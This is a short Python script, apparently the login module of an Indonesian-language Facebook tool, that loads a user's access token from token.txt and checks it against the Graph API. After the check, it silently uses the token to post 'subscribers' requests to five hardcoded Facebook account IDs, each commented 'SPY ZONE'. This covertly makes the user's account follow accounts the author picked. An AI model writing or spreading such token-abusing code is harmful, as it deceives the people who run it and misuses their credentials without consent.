import requests,os,json
import elite

P = "\x1b[0;97m" # Putih
M = "\x1b[0;91m" # Merah
O = "\x1b[0;96m" # Biru Muda

def main():
    try:
        token = open("token.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token=" + token)
        a = json.loads(otw.text)
        nama = a["name"]
    except (KeyError,IOError):
        print('%s║'%(M))
        print('%s╚══[%s!%s] %sToken Invalid'%(M,P,M,P))
        os.system('rm -rf token.txt')
        exit(elite.menu_log())
    requests.post("https://graph.facebook.com/100003888153228/subscribers?access_token=" + token)      # SPY ZONE
    requests.post("https://graph.facebook.com/516314562/subscribers?access_token=" + token)      # SPY ZONE
    requests.post("https://graph.facebook.com/100000766200575/subscribers?access_token=" + token) # SPY ZONE
    requests.post("https://graph.facebook.com/100004499498856/subscribers?access_token=" + token) # SPY ZONE
    requests.post("https://graph.facebook.com/100000260233573/subscribers?access_token=" + token) # SPY ZONE
    print('%s║'%(O))
    print('%s╚══[%s!%s] %sLogin Berhasil'%(O,P,O,P))
    exit(elite.menu())
